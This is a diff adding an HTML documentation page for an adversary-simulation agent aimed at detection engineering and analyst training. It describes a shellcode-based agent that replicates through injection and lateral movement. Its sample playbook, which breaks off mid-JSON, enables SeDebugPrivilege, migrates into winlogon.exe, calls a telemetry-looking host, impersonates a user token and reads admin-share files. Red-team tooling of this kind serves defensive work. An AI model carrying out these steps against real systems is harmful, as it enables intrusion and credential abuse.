@@ -1,0 +1,1682 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AGENT // ACE Responder</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --nord0: #2E3440;
+            --nord1: #3B4252;
+            --nord2: #434C5E;
+            --nord3: #4C566A;
+            --nord4: #D8DEE9;
+            --nord5: #E5E9F0;
+            --nord6: #ECEFF4;
+            --nord7: #8FBCBB;
+            --nord8: #88C0D0;
+            --nord9: #81A1C1;
+            --nord10: #5E81AC;
+            --nord11: #BF616A;
+            --nord12: #D08770;
+            --nord13: #EBCB8B;
+            --nord14: #A3BE8C;
+            --nord15: #B48EAD;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--nord0);
+            color: var(--nord4);
+            font-family: 'JetBrains Mono', monospace;
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(136, 192, 208, 0.015) 2px,
+                rgba(136, 192, 208, 0.015) 4px
+            );
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        .grid-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(136, 192, 208, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(136, 192, 208, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 1.5rem 3rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: linear-gradient(180deg, var(--nord0) 0%, transparent 100%);
+            z-index: 1000;
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 0.9rem;
+            letter-spacing: 0.3em;
+            color: var(--nord8);
+            text-shadow: 0 0 20px rgba(136, 192, 208, 0.5);
+        }
+
+        .logo span {
+            color: var(--nord11);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 3rem;
+        }
+
+        .nav-links a {
+            color: var(--nord4);
+            text-decoration: none;
+            font-size: 0.75rem;
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            position: relative;
+            transition: color 0.3s ease;
+        }
+
+        .nav-links a:hover {
+            color: var(--nord8);
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            width: 0;
+            height: 1px;
+            background: var(--nord8);
+            transition: width 0.3s ease;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            padding: 2rem;
+            overflow: hidden;
+        }
+
+        .hero-content {
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .classification {
+            font-size: 0.65rem;
+            letter-spacing: 0.5em;
+            color: var(--nord11);
+            margin-bottom: 2rem;
+            padding: 0.5rem 1.5rem;
+            border: 1px solid var(--nord11);
+            display: inline-block;
+            animation: pulse-border 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-border {
+            0%, 100% { border-color: var(--nord11); box-shadow: 0 0 10px rgba(191, 97, 106, 0.3); }
+            50% { border-color: var(--nord11); box-shadow: 0 0 25px rgba(191, 97, 106, 0.6); }
+        }
+
+        .hero h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: clamp(3rem, 12vw, 10rem);
+            font-weight: 900;
+            letter-spacing: 0.1em;
+            color: var(--nord6);
+            text-shadow: 
+                0 0 40px rgba(136, 192, 208, 0.4),
+                0 0 80px rgba(136, 192, 208, 0.2);
+            position: relative;
+            animation: glitch-text 4s ease-in-out infinite;
+        }
+
+        @keyframes glitch-text {
+            0%, 90%, 100% { 
+                text-shadow: 
+                    0 0 40px rgba(136, 192, 208, 0.4),
+                    0 0 80px rgba(136, 192, 208, 0.2);
+            }
+            92% { 
+                text-shadow: 
+                    -2px 0 var(--nord11),
+                    2px 0 var(--nord8),
+                    0 0 40px rgba(136, 192, 208, 0.4);
+            }
+            94% { 
+                text-shadow: 
+                    2px 0 var(--nord11),
+                    -2px 0 var(--nord8),
+                    0 0 40px rgba(136, 192, 208, 0.4);
+            }
+        }
+
+        .subtitle {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.8rem;
+            letter-spacing: 0.4em;
+            color: var(--nord8);
+            margin-top: 1rem;
+            opacity: 0.8;
+        }
+
+        .hero-tagline {
+            max-width: 600px;
+            margin: 3rem auto 0;
+            font-size: 1rem;
+            color: var(--nord4);
+            opacity: 0.7;
+            line-height: 2;
+        }
+
+        .scroll-indicator {
+            position: absolute;
+            bottom: 3rem;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--nord3);
+            font-size: 0.65rem;
+            letter-spacing: 0.3em;
+            animation: float 2s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateX(-50%) translateY(0); }
+            50% { transform: translateX(-50%) translateY(10px); }
+        }
+
+        .scroll-indicator svg {
+            width: 20px;
+            height: 20px;
+            stroke: var(--nord8);
+        }
+
+        section {
+            padding: 8rem 2rem;
+            max-width: 1400px;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+            margin-bottom: 4rem;
+        }
+
+        .section-number {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 4rem;
+            font-weight: 900;
+            color: var(--nord1);
+            -webkit-text-stroke: 1px var(--nord3);
+        }
+
+        .section-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.9rem;
+            letter-spacing: 0.3em;
+            color: var(--nord8);
+            text-transform: uppercase;
+        }
+
+        .section-line {
+            flex: 1;
+            height: 1px;
+            background: linear-gradient(90deg, var(--nord3), transparent);
+        }
+
+        /* Shellcode Structure Visualization */
+        .shellcode-structure {
+            background: var(--nord1);
+            border: 1px solid var(--nord2);
+            padding: 3rem;
+            margin-bottom: 4rem;
+            overflow-x: auto;
+        }
+
+        .shellcode-structure h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.8rem;
+            letter-spacing: 0.2em;
+            color: var(--nord8);
+            margin-bottom: 2rem;
+            text-transform: uppercase;
+        }
+
+        .structure-visual {
+            display: flex;
+            align-items: stretch;
+            gap: 0;
+            font-size: 0.75rem;
+            width: 100%;
+        }
+
+        .structure-block {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .structure-block.expand {
+            flex: 1;
+        }
+
+        .block-content {
+            padding: 1.5rem 2rem;
+            border: 2px solid;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 80px;
+            position: relative;
+        }
+
+        .block-content.expand {
+            width: 100%;
+        }
+
+        .block-shellcode {
+            border-color: var(--nord11);
+            background: rgba(191, 97, 106, 0.1);
+            color: var(--nord11);
+        }
+
+        .block-task {
+            border-color: var(--nord13);
+            background: rgba(235, 203, 139, 0.1);
+            color: var(--nord13);
+            min-width: 60px;
+        }
+
+        .block-bytecode {
+            border-color: var(--nord8);
+            background: rgba(136, 192, 208, 0.05);
+            padding: 0;
+            display: flex;
+            width: 100%;
+        }
+
+        .bytecode-inner {
+            display: flex;
+            align-items: stretch;
+            width: 100%;
+        }
+
+        .bytecode-section {
+            padding: 1.5rem 1.5rem;
+            border-right: 1px dashed var(--nord3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--nord4);
+            flex: 1;
+        }
+
+        .bytecode-section:last-child {
+            border-right: none;
+        }
+
+        .bytecode-section.constants {
+            color: var(--nord14);
+        }
+
+        .bytecode-section.taskset {
+            color: var(--nord15);
+        }
+
+        .block-label {
+            font-size: 0.65rem;
+            letter-spacing: 0.1em;
+            color: var(--nord3);
+            margin-top: 0.75rem;
+            text-transform: uppercase;
+        }
+
+        .outer-bracket {
+            font-size: 4rem;
+            color: var(--nord3);
+            line-height: 1;
+            display: flex;
+            align-items: center;
+        }
+
+        /* Overview Grid */
+        .overview-content {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 3rem;
+        }
+
+        .overview-text h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: var(--nord6);
+            margin-bottom: 2rem;
+            line-height: 1.3;
+        }
+
+        .overview-text p {
+            color: var(--nord4);
+            margin-bottom: 1.5rem;
+            font-size: 0.95rem;
+            max-width: 900px;
+        }
+
+        .tech-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: var(--nord1);
+            border: 1px solid var(--nord2);
+            padding: 0.5rem 1rem;
+            font-size: 0.7rem;
+            color: var(--nord7);
+            letter-spacing: 0.1em;
+            margin-right: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .tech-badge::before {
+            content: '◆';
+            color: var(--nord8);
+            font-size: 0.5rem;
+        }
+
+        /* Playbook with Callouts */
+        .playbook-container {
+            position: relative;
+            margin-top: 4rem;
+        }
+
+        .terminal-window {
+            background: var(--nord1);
+            border: 1px solid var(--nord2);
+            border-radius: 4px;
+            overflow: hidden;
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        .terminal-header {
+            background: var(--nord2);
+            padding: 0.75rem 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .terminal-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+
+        .terminal-dot.red { background: var(--nord11); }
+        .terminal-dot.yellow { background: var(--nord13); }
+        .terminal-dot.green { background: var(--nord14); }
+
+        .terminal-title {
+            flex: 1;
+            text-align: center;
+            font-size: 0.7rem;
+            color: var(--nord4);
+            letter-spacing: 0.1em;
+        }
+
+        .terminal-body {
+            padding: 1.5rem;
+            font-size: 0.75rem;
+            line-height: 1.8;
+            color: var(--nord4);
+            overflow-x: auto;
+        }
+
+        .terminal-body .comment { color: var(--nord3); }
+        .terminal-body .keyword { color: var(--nord15); }
+        .terminal-body .string { color: var(--nord14); }
+        .terminal-body .function { color: var(--nord8); }
+        .terminal-body .number { color: var(--nord12); }
+        .terminal-body .operator { color: var(--nord9); }
+
+        .callout-marker {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 18px;
+            height: 18px;
+            background: var(--nord11);
+            color: var(--nord6);
+            font-size: 0.6rem;
+            font-weight: 700;
+            border-radius: 50%;
+            margin-left: 0.5rem;
+            vertical-align: middle;
+        }
+
+        .callouts-list {
+            margin-top: 2rem;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .callout-item {
+            display: flex;
+            gap: 1rem;
+            align-items: flex-start;
+        }
+
+        .callout-number {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+            height: 24px;
+            background: var(--nord11);
+            color: var(--nord6);
+            font-size: 0.7rem;
+            font-weight: 700;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+
+        .callout-text {
+            font-size: 0.85rem;
+            color: var(--nord4);
+            line-height: 1.6;
+        }
+
+        /* Capabilities Section */
+        .capabilities-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 2rem;
+        }
+
+        .capability-card {
+            background: linear-gradient(135deg, var(--nord1) 0%, var(--nord0) 100%);
+            border: 1px solid var(--nord2);
+            padding: 2.5rem;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.4s ease;
+        }
+
+        .capability-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, var(--nord8), var(--nord15));
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .capability-card:hover::before {
+            opacity: 1;
+        }
+
+        .capability-card:hover {
+            border-color: var(--nord3);
+            transform: translateY(-4px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .capability-icon {
+            width: 48px;
+            height: 48px;
+            background: var(--nord2);
+            border: 1px solid var(--nord3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1.5rem;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.2rem;
+            color: var(--nord8);
+        }
+
+        .capability-card h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.85rem;
+            letter-spacing: 0.15em;
+            color: var(--nord6);
+            margin-bottom: 1rem;
+            text-transform: uppercase;
+        }
+
+        .capability-card p {
+            color: var(--nord4);
+            font-size: 0.85rem;
+            opacity: 0.8;
+            line-height: 1.8;
+        }
+
+        /* Limitation Card */
+        .limitation-card {
+            background: linear-gradient(135deg, rgba(191, 97, 106, 0.1) 0%, var(--nord0) 100%);
+            border: 1px solid var(--nord11);
+            padding: 2rem;
+            margin-top: 2rem;
+        }
+
+        .limitation-card h4 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.75rem;
+            letter-spacing: 0.15em;
+            color: var(--nord11);
+            margin-bottom: 1rem;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .limitation-card p {
+            color: var(--nord4);
+            font-size: 0.85rem;
+            opacity: 0.8;
+            line-height: 1.8;
+        }
+
+        /* Architecture Section */
+        .architecture-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4rem;
+        }
+
+        .arch-details h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5rem;
+            color: var(--nord6);
+            margin-bottom: 2rem;
+        }
+
+        .arch-feature {
+            display: flex;
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--nord2);
+        }
+
+        .arch-feature:last-child {
+            border-bottom: none;
+        }
+
+        .arch-feature-icon {
+            width: 40px;
+            height: 40px;
+            background: var(--nord2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            color: var(--nord8);
+            font-size: 1rem;
+        }
+
+        .arch-feature h4 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.8rem;
+            letter-spacing: 0.1em;
+            color: var(--nord6);
+            margin-bottom: 0.5rem;
+        }
+
+        .arch-feature p {
+            font-size: 0.85rem;
+            color: var(--nord4);
+            opacity: 0.8;
+        }
+
+        /* Skull Animation */
+        .replication-animation {
+            background: var(--nord1);
+            border: 1px solid var(--nord2);
+            padding: 3rem;
+            position: relative;
+            height: 500px;
+            overflow: hidden;
+        }
+
+        .animation-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.7rem;
+            letter-spacing: 0.2em;
+            color: var(--nord3);
+            text-transform: uppercase;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+
+        .animation-stage {
+            position: relative;
+            width: 100%;
+            height: 400px;
+        }
+
+        .skull-agent {
+            position: absolute;
+            width: 80px;
+            height: 80px;
+        }
+
+        .skull-agent svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .skull-agent svg path {
+            fill: var(--nord11);
+        }
+
+        .task-label {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.5rem;
+            color: var(--nord6);
+            background: var(--nord0);
+            padding: 2px 4px;
+            white-space: nowrap;
+            z-index: 10;
+        }
+
+        .file-icon {
+            position: absolute;
+            width: 60px;
+            height: 70px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+        }
+
+        .file-icon-body {
+            width: 50px;
+            height: 60px;
+            background: var(--nord2);
+            border: 2px solid var(--nord3);
+            border-radius: 4px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .file-icon-fold {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 12px;
+            height: 12px;
+            background: var(--nord1);
+            border-left: 2px solid var(--nord3);
+            border-bottom: 2px solid var(--nord3);
+        }
+
+        .file-icon-label {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.6rem;
+            font-weight: 700;
+            color: var(--nord8);
+        }
+
+        /* Skull 1 - Origin */
+        .skull-1 {
+            left: 50%;
+            top: 50px;
+            transform: translateX(-50%);
+            animation: skull1-pulse 8s ease-in-out infinite;
+        }
+
+        @keyframes skull1-pulse {
+            0%, 100% { filter: drop-shadow(0 0 10px rgba(191, 97, 106, 0.5)); }
+            50% { filter: drop-shadow(0 0 20px rgba(191, 97, 106, 0.8)); }
+        }
+
+        /* Skull 2 - Emerges and goes to EXE */
+        .skull-2 {
+            left: 50%;
+            top: 50px;
+            transform: translateX(-50%);
+            opacity: 0;
+            animation: skull2-journey 8s ease-in-out infinite;
+        }
+
+        @keyframes skull2-journey {
+            0%, 10% { 
+                opacity: 0; 
+                left: 50%; 
+                top: 50px;
+                transform: translateX(-50%) scale(0.5);
+            }
+            20% { 
+                opacity: 1; 
+                left: 50%; 
+                top: 50px;
+                transform: translateX(-50%) scale(1);
+            }
+            35% { 
+                opacity: 1; 
+                left: 70%; 
+                top: 50px;
+                transform: translateX(-50%) scale(1);
+            }
+            45%, 50% { 
+                opacity: 0; 
+                left: 70%; 
+                top: 50px;
+                transform: translateX(-50%) scale(0.3);
+            }
+            51%, 100% {
+                opacity: 0;
+                left: 70%;
+                top: 50px;
+            }
+        }
+
+        /* EXE Icon */
+        .exe-icon {
+            left: 70%;
+            top: 40px;
+            transform: translateX(-50%);
+            animation: exe-appear 8s ease-in-out infinite;
+        }
+
+        @keyframes exe-appear {
+            0%, 30% { opacity: 0; transform: translateX(-50%) scale(0.8); }
+            40% { opacity: 1; transform: translateX(-50%) scale(1); }
+            55% { opacity: 1; left: 70%; top: 40px; }
+            75% { opacity: 1; left: 80%; top: 180px; }
+            85%, 100% { opacity: 0; left: 85%; top: 220px; }
+        }
+
+        /* Skull 3 - Emerges and goes to DLL */
+        .skull-3 {
+            left: 50%;
+            top: 50px;
+            transform: translateX(-50%);
+            opacity: 0;
+            animation: skull3-journey 8s ease-in-out infinite;
+        }
+
+        @keyframes skull3-journey {
+            0%, 50% { 
+                opacity: 0; 
+                left: 50%; 
+                top: 50px;
+                transform: translateX(-50%) scale(0.5);
+            }
+            60% { 
+                opacity: 1; 
+                left: 50%; 
+                top: 50px;
+                transform: translateX(-50%) scale(1);
+            }
+            75% { 
+                opacity: 1; 
+                left: 30%; 
+                top: 50px;
+                transform: translateX(-50%) scale(1);
+            }
+            85%, 90% { 
+                opacity: 0; 
+                left: 30%; 
+                top: 50px;
+                transform: translateX(-50%) scale(0.3);
+            }
+            91%, 100% {
+                opacity: 0;
+            }
+        }
+
+        /* DLL Icon */
+        .dll-icon {
+            left: 30%;
+            top: 40px;
+            transform: translateX(-50%);
+            animation: dll-appear 8s ease-in-out infinite;
+        }
+
+        @keyframes dll-appear {
+            0%, 70% { opacity: 0; transform: translateX(-50%) scale(0.8); }
+            80% { opacity: 1; transform: translateX(-50%) scale(1); }
+            90% { opacity: 1; left: 30%; top: 40px; }
+            100% { opacity: 0.5; left: 20%; top: 180px; }
+        }
+
+        .dll-icon .file-icon-label {
+            color: var(--nord15);
+        }
+
+        /* Opcodes Section */
+        .opcodes-section {
+            background: var(--nord1);
+            border: 1px solid var(--nord2);
+            padding: 3rem;
+        }
+
+        .opcodes-section h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.2rem;
+            color: var(--nord6);
+            margin-bottom: 2rem;
+        }
+
+        .opcode-categories {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+
+        .opcode-category {
+            background: var(--nord0);
+            border: 1px solid var(--nord2);
+            padding: 1.5rem;
+        }
+
+        .opcode-category h4 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.75rem;
+            letter-spacing: 0.15em;
+            color: var(--nord8);
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid var(--nord2);
+            text-transform: uppercase;
+        }
+
+        .opcode-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .opcode-item {
+            font-size: 0.7rem;
+            color: var(--nord4);
+            background: var(--nord1);
+            padding: 0.3rem 0.6rem;
+            border: 1px solid var(--nord2);
+            transition: all 0.2s ease;
+        }
+
+        .opcode-item:hover {
+            border-color: var(--nord8);
+            color: var(--nord8);
+        }
+
+        /* Demo Section */
+        .demo-section {
+            display: grid;
+            grid-template-columns: 1fr 1.5fr;
+            gap: 3rem;
+            align-items: start;
+        }
+
+        .demo-download {
+            background: linear-gradient(135deg, var(--nord1) 0%, var(--nord0) 100%);
+            border: 1px solid var(--nord2);
+            padding: 3rem;
+            text-align: center;
+        }
+
+        .demo-download h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.2rem;
+            color: var(--nord6);
+            margin-bottom: 1rem;
+        }
+
+        .demo-download p {
+            font-size: 0.85rem;
+            color: var(--nord4);
+            opacity: 0.7;
+            margin-bottom: 2rem;
+            line-height: 1.8;
+        }
+
+        .download-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.75rem;
+            background: var(--nord11);
+            color: var(--nord6);
+            border: none;
+            padding: 1rem 2rem;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.8rem;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .download-btn:hover {
+            background: var(--nord11);
+            box-shadow: 0 0 30px rgba(191, 97, 106, 0.5);
+            transform: translateY(-2px);
+        }
+
+        .download-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        .demo-warning {
+            margin-top: 1.5rem;
+            font-size: 0.7rem;
+            color: var(--nord13);
+            opacity: 0.8;
+        }
+
+        .demo-playbook {
+            background: var(--nord1);
+            border: 1px solid var(--nord2);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .demo-playbook .terminal-header {
+            background: var(--nord2);
+            padding: 0.75rem 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .demo-playbook .terminal-body {
+            padding: 1.5rem;
+            font-size: 0.75rem;
+            line-height: 1.8;
+            color: var(--nord4);
+        }
+
+        @media (max-width: 900px) {
+            .demo-section {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Footer */
+        footer {
+            padding: 4rem 2rem;
+            text-align: center;
+            border-top: 1px solid var(--nord2);
+            background: var(--nord0);
+        }
+
+        .footer-logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: 0.2em;
+            color: var(--nord8);
+            margin-bottom: 1rem;
+            text-shadow: 0 0 30px rgba(136, 192, 208, 0.4);
+        }
+
+        .footer-copy {
+            font-size: 0.7rem;
+            color: var(--nord3);
+            letter-spacing: 0.1em;
+        }
+
+        /* Corner decorations */
+        .corner-decoration {
+            position: fixed;
+            width: 100px;
+            height: 100px;
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        .corner-decoration.top-left {
+            top: 0;
+            left: 0;
+            border-top: 1px solid var(--nord3);
+            border-left: 1px solid var(--nord3);
+        }
+
+        .corner-decoration.top-right {
+            top: 0;
+            right: 0;
+            border-top: 1px solid var(--nord3);
+            border-right: 1px solid var(--nord3);
+        }
+
+        .corner-decoration.bottom-left {
+            bottom: 0;
+            left: 0;
+            border-bottom: 1px solid var(--nord3);
+            border-left: 1px solid var(--nord3);
+        }
+
+        .corner-decoration.bottom-right {
+            bottom: 0;
+            right: 0;
+            border-bottom: 1px solid var(--nord3);
+            border-right: 1px solid var(--nord3);
+        }
+
+        /* Responsive */
+        @media (max-width: 1200px) {
+            .architecture-content {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 900px) {
+            nav {
+                padding: 1rem 1.5rem;
+            }
+
+            .nav-links {
+                display: none;
+            }
+
+            .structure-visual {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .outer-bracket {
+                display: none;
+            }
+        }
+
+        .fade-in {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.8s ease;
+        }
+
+        .fade-in.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body>
+    <div class="grid-bg"></div>
+    <div class="corner-decoration top-left"></div>
+    <div class="corner-decoration top-right"></div>
+    <div class="corner-decoration bottom-left"></div>
+    <div class="corner-decoration bottom-right"></div>
+
+    <nav>
+        <div class="logo">ACE<span>_</span>RESPONDER</div>
+        <div class="nav-links">
+            <a href="#overview">Overview</a>
+            <a href="#capabilities">Capabilities</a>
+            <a href="#architecture">Architecture</a>
+            <a href="#opcodes">Opcodes</a>
+            <a href="#demo">Demo</a>
+        </div>
+    </nav>
+
+    <section class="hero">
+        <div class="hero-content">
+            <div class="classification">◈ TECHNICAL DOCUMENTATION // CLASSIFIED ◈</div>
+            <h1>AGENT</h1>
+            <div class="subtitle">ADVERSARY SIMULATION PLATFORM</div>
+            <p class="hero-tagline">
+                Playbook-driven simulation engine for detection engineering<br>
+                and security analyst training. Fire-and-forget adversary simulation.
+            </p>
+        </div>
+        <div class="scroll-indicator">
+            <span>SCROLL</span>
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M12 5v14M19 12l-7 7-7-7"/>
+            </svg>
+        </div>
+    </section>
+
+    <section id="overview">
+        <div class="section-header">
+            <span class="section-number">01</span>
+            <span class="section-title">System Overview</span>
+            <div class="section-line"></div>
+        </div>
+
+        <!-- Shellcode Structure Visualization -->
+        <div class="shellcode-structure fade-in">
+            <h3>Shellcode Memory Layout</h3>
+            <div class="structure-visual">
+                <span class="outer-bracket">[</span>
+                <div class="structure-block">
+                    <div class="block-content block-shellcode">SHELLCODE</div>
+                    <span class="block-label">Agent Core</span>
+                </div>
+                <div class="structure-block">
+                    <div class="block-content block-task">TASK</div>
+                    <span class="block-label">1 byte</span>
+                </div>
+                <div class="structure-block expand">
+                    <div class="block-content block-bytecode expand">
+                        <div class="bytecode-inner">
+                            <div class="bytecode-section constants">CONSTANTS</div>
+                            <div class="bytecode-section taskset">TASK_SET_0</div>
+                            <div class="bytecode-section taskset">TASK_SET_1</div>
+                            <div class="bytecode-section taskset">...</div>
+                            <div class="bytecode-section taskset">TASK_SET_N</div>
+                        </div>
+                    </div>
+                    <span class="block-label">Bytecode Payload</span>
+                </div>
+                <span class="outer-bracket">]</span>
+            </div>
+        </div>
+
+        <div class="overview-content fade-in">
+            <div class="overview-text">
+                <h2>Self-Contained Adversary Simulation</h2>
+                <p>
+                    Agent executes pre-defined playbooks that replicate real-world attack techniques. The shellcode contains all of the agent's tasks and executes them autonomously without operator interaction, resulting in repeatable, fire-and-forget adversary simulation.
+                </p>
+                <p>
+                    Because the agent is entirely self-contained, it propagates through the environment via injection or lateral movement by replicating itself and updating only the task byte. Each replica knows exactly which task set to execute, enabling complex multi-stage attack chains from a single deployment.
+                </p>
+                <div style="margin-top: 2rem;">
+                    <span class="tech-badge">Python Scripting</span>
+                    <span class="tech-badge">COFF Loader</span>
+                    <span class="tech-badge">AI Friendly</span>
+                    <span class="tech-badge">Position-Independent</span>
+                    <span class="tech-badge">Adversary & NPC Simulation</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Playbook with Callouts -->
+        <div class="playbook-container fade-in">
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-dot red"></div>
+                    <div class="terminal-dot yellow"></div>
+                    <div class="terminal-dot green"></div>
+                    <span class="terminal-title">playbook.json</span>
+                </div>
+                <div class="terminal-body">
+<pre>{
+  <span class="string">"constants"</span>: [<span class="callout-marker">1</span>
+    <span class="string">"C:\\Users\\alice\\AppData\\Local\\Temp\\energyprov.xml"</span>,
+    <span class="string">"\\\\win11-21\\c$\\Windows\\system32\\energyprov.xml"</span>
+  ],
+  <span class="string">"task_sets"</span>: {<span class="callout-marker">2</span>
+    <span class="string">"0"</span>: [
+      { <span class="string">"op"</span>: <span class="string">"enable_privilege"</span>, <span class="string">"search"</span>: <span class="string">""</span>, <span class="string">"priv_name"</span>: <span class="string">"SeDebugPrivilege"</span> },<span class="callout-marker">3</span>
+      { <span class="string">"op"</span>: <span class="string">"migrate"</span>, <span class="string">"task"</span>: <span class="number">1</span>, <span class="string">"search"</span>: <span class="string">"winlogon.exe"</span> }
+    ],
+    <span class="string">"1"</span>: [
+      { <span class="string">"op"</span>: <span class="string">"sleep"</span>, <span class="string">"ms"</span>: <span class="number">40000</span> },
+      { <span class="string">"op"</span>: <span class="string">"http_send"</span>, <span class="string">"method"</span>: <span class="string">"GET"</span>, <span class="string">"host"</span>: <span class="string">"update-telemetry.azureedge.net"</span>, ... },
+      { <span class="string">"op"</span>: <span class="string">"make_token"</span>, <span class="string">"domain"</span>: <span class="string">"aceresponder"</span>, <span class="string">"username"</span>: <span class="string">"bob"</span>, ... },
+      { <span class="string">"op"</span>: <span class="string">"read_file"</span>, <span class="string">"path"</span>: <span class="string">"%0"</span> },
